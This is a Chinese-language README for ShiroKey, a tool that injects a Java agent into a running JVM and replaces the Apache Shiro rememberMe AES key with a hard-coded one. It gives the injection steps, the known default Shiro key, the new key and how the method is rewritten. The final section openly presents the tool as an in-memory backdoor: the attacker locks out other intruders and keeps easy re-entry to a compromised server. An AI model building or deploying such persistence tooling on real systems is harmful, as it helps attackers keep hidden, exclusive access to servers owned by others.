# ShiroKey

用于替换shiro aes加密的key

## 使用方法



1.  获取注入进程的pid号，此处为1621

    <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210312155055073.png" alt="image-20210312155055073" style="zoom:50%;" />

    现在的key是` kPH+bIxk5D2deZiIxcaaaA==`

    ![image-20210312155303130](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210312155303130.png)

2.  注入

    讲三个jar包放入统一目录下，运行`java -jar shiroAgent.jar`，并输入pid，注入成功

    ![image-20210312155543666](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210312155543666.png)

3.  注入成功

    在目标jar中会打印如下信息，之前调试用的，不喜欢可以删除。

    ![image-20210312155659799](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210312155659799.png)

4.  测试结果

    key被修改为`4AvVhmFLUs0KTA3Kprsdag==`

    ![image-20210312155742436](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210312155742436.png)

## 原理

使用`Java agent`技术，在运行时attach到目标虚拟机上，添加`Transformer` <br/>
在`Transformer`中利用`ClassLoader`加载工具类（直接使用会说找不到类`ClassNotFoundExcepiton`) <br/>
修改`org.apache.shiro.mgt.AbstractRememberMeManager`类的`getDecryptionCipherKey`方法 <br/>
调用 `this.setCipherKey` 方法，设定shiro的Key `(org.apache.shiro.codec.Base64.decode("4AvVhmFLUs0KTA3Kprsdag=="))` <br/>
可以重新编译设定不同的key。

## 意义

hzgg： 这个的意义就是修改完了之后，key只有自己知道，别人打不进来，自己好打。 <br/>

想了一下，相当于是一个后门，在内存中，算是个变相的内存马吧。